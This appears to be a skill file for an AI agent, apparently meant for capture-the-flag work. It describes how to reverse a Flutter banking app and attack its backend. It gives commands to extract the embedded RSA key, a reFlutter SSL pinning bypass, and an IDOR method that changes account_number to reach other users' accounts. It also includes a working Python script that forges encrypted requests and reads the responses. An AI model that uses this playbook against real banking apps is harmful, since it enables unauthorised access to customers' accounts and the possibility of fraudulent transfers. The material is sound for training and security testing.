---
name: flutter-bank-rsa-idor
description: Use when reversing a Flutter AOT banking app that encrypts requests with RSA-OAEP + AES-256-CBC using an embedded public key, and the backend has IDOR vulnerabilities. Triggers - "Flutter banking RSA", "RSA-OAEP AES", "librsa_bridge.so", "IDOR Flutter"
platform: [android]
stack: [flutter]
category: crypto
tier: B
related: []
---

# Skill: Flutter AOT Banking App: RSA-OAEP+AES + IDOR

## Context
Flutter mobile banking apps (Dart AOT) that encrypt requests with RSA-OAEP + AES-256-CBC using an embedded public key, and where the backend has an IDOR in the transaction/account endpoints.

## Typical architecture
- **Frontend**: Flutter (Dart AOT compiled into `libapp.so`), native bridge `librsa_bridge.so` (fast_rsa / rsa-mobile, Go gomobile)
- **Crypto**: RSA-OAEP (PKCS1) to encrypt the AES params (key+IV), AES-256-CBC to encrypt the JSON body
- **Backend**: REST API with `/api/v1/` base path, endpoints: `user/register`, `loginUser`, `fetchAccount`, `fetchAccountDetails`, `transaction/transfer`, `transaction/history`

## Analysis methodology

### 1. Static recon
```bash
# Extract the APK
unzip infinity-bank.apk -d /tmp/infinity_extract

# Identify the Flutter stack
ls lib/arm64-v8a/  # libapp.so, libflutter.so, librsa_bridge.so

# Dart version
strings libflutter.so | grep -oE "[0-9]+\.[0-9]+\.[0-9]+ \(stable\)"
# → 3.6.2 (stable)

# Strings from the Dart snapshot
strings -n 6 libapp.so > libapp_strings.txt

# Search for endpoints, crypto, keys
grep -iE "api\.|/api/|login|register|transfer|account|encrypt|decrypt|RSA|AES|BEGIN.*KEY" libapp_strings.txt
```

### 2. Extract the RSA public key
```bash
strings libapp.so | grep -A 20 "BEGIN PUBLIC KEY"
# → MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApNd3nBo8D+otwWmrSr3X...
```

### 3. Map the API endpoints
```bash
grep -nE "user/register|loginUser|fetchAccount|transaction/transfer|transaction/history|/api/v1" libapp_strings.txt
```

### 4. Configure the server in Genymotion/emulator
- The app shows a "Server Configuration" screen if no IP is saved
- SharedPreferences file: `FlutterSharedPreferences.xml` (NOT `Flutter.xml`)
- Key: `flutter.server_ip` (with the `flutter.` prefix)
- Value: `<IP>:<port>` (e.g. `10.0.2.2:8443`)

```bash
# Write SharedPreferences directly (app must be debuggable)
cat > /tmp/FlutterSharedPreferences.xml << 'EOF'
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="flutter.server_ip">10.0.2.2:8443</string>
</map>
EOF
adb push /tmp/FlutterSharedPreferences.xml /data/local/tmp/
adb shell "run-as com.example.bank cp /data/local/tmp/FlutterSharedPreferences.xml /data/data/com.example.bank/shared_prefs/FlutterSharedPreferences.xml"
```

### 5. SSL pinning bypass
- **reFlutter** patches the Flutter snapshot to accept any SSL cert
```bash
reflutter infinity-bank.apk  # generates release.RE.apk
# Sign and install
```

### 6. Input in Flutter EditText (ADB)
- `adb shell input text` works if the IME is LatinIME (not ADBKeyboard)
- For numeric fields (PIN): `adb shell input keyevent 8` (1), `9` (2), `10` (3), `11` (4)
- Hide the keyboard before tapping buttons: `adb shell input keyevent 4` (BACK)

### 7. Capture traffic
- Mock backend in Python (ssl) to see the encrypted requests
- Or Burp Suite with proxy + reFlutter

## Encryption scheme (RSA-OAEP + AES)
```python
# 1. Generate an AES key (32 bytes) + IV (16 bytes)
# 2. Encrypt the JSON body with AES-256-CBC
# 3. Encrypt (key+IV) with RSA-OAEP using the embedded public key
# 4. Send: encrypted_body + encrypted_params
# The response is also encrypted (same scheme)
```

## IDOR vector
- The `transaction/transfer` or `fetchAccountDetails` endpoint accepts `from_account`/`to_account`/`account_number`
- Modify the `account_number` to access other users' accounts
- The flag is in the admin account or in a special transaction

## Forging/reading hybrid encrypted traffic (atomic subsection)

**When:** any Flutter app (Dart AOT) with a hybrid `RSA-OAEP + AES-256-CBC` scheme where the public key is embedded but the private one is NOT (you cannot decrypt captured traffic: only re-forge it).

**Typical envelope (confirm field names in `libapp.so` strings):**
```json
{ "data":          "b64( custom_encode( AES-256-CBC-PKCS7(json) ) )",
  "encryptedKey":  "b64( RSA-OAEP-SHA1(aes_key[32]) )",
  "encryptedIv":   "b64( RSA-OAEP-SHA1(iv[16]) )",
  "encryptedSalt": "b64( RSA-OAEP-SHA1(salt) )" }   // variants: encryptedData, encrypted_body, ...
```
- The AES key + IV are **session-scoped, client-generated** (one per request).
- `encryptedKey`/`encryptedIv` are encrypted with the **embedded public key** → re-encrypting = re-forging.
- There may be a custom encoding over the AES ciphertext before base64 (e.g. `reverseXORBase64` / `CT_xor`, a byte constant to extract via disassembly).
- The response reuses the request's AES params → **you read it with YOUR own key** (you do not need the server's private key).

**Golden rule (why you do NOT patch a captured request):** with AES-CBC + PKCS7, any altered byte in `data` breaks the un-padding or decrypts to garbage, and `encryptedKey` can only be opened by the server's private key. **Only path: forge with the embedded public key.**

**Forging flow (pycryptodome):**
```python
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Hash import SHA1
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
import os, json, base64

pub = RSA.import_key(open("aux/rsa_public_key.pem").read())
key, iv, salt = os.urandom(32), os.urandom(16), os.urandom(2)

def xorb64(data):                      # client custom encoding (reverseXORBase64)
    return base64.b64encode(bytes(b ^ 0xAA for b in reversed(data))).decode()

def forge(plain_obj):
    ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(json.dumps(plain_obj).encode(), 16))
    return {"data": xorb64(ct),
            "encryptedKey": base64.b64encode(PKCS1_OAEP.new(pub, hashAlgo=SHA1).encrypt(key)).decode(),
            "encryptedIv":  base64.b64encode(PKCS1_OAEP.new(pub, hashAlgo=SHA1).encrypt(iv)).decode(),
            "encryptedSalt": base64.b64encode(PKCS1_OAEP.new(pub, hashAlgo=SHA1).encrypt(salt)).decode()}

def read_response(env):                # the backend reuses YOUR key/iv
    ct = bytes(b ^ 0xAA for b in reversed(base64.b64decode(env["data"])))
    return json.loads(unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct), 16))
```

**Quick checks to parameterize:**
1. Does `data` use `reverseXORBase64`? `strings libapp.so | grep -iE "reverseXOR|CT_xor"` → adjust `XOR_BYTE` and the reversal (try `reverse(bytes)` vs `bytes`).
2. Salt in the envelope? Verify `encryptedSalt` in strings; if the scheme uses no salt, omit it.
3. OAEP with SHA-1 or SHA-256? `strings libapp.so | grep -i OAEP` → `OAEPEncoding.withSHA1` (SHA-1) vs `withSHA256`.
4. The session token (`auth_token`) travels INSIDE the encrypted JSON → forge the previous login too to capture it, or reuse an already-issued token.

## Key tools
- `jadx`: decompile classes.dex (Java wrapper)
- `apktool`: smali + manifest + rebuild
- `radare2`: search strings/exports in libapp.so
- `reflutter`: patch the snapshot for SSL bypass
- `frida-gadget`: inject into an APK without root (listen/script mode)
- `ADBKeyboard`: does NOT work with Flutter; use `input text` + LatinIME

## Lessons learned
1. **SharedPreferences**: the modern plugin uses `FlutterSharedPreferences.xml` with the `flutter.` prefix on keys
2. **Flutter + ADB**: `input text` works with LatinIME but not ADBKeyboard; for PINs use numeric keycodes
3. **Blutter**: compiling on macOS can hang (U-state processes); use `--dart-version` to avoid compiling the runtime
4. **Embedded Frida gadget**: does not expose the Java runtime; use native hooks (libc, SSL_write/read)
5. **SSL pinning in Flutter**: reFlutter is the fastest no-root bypass
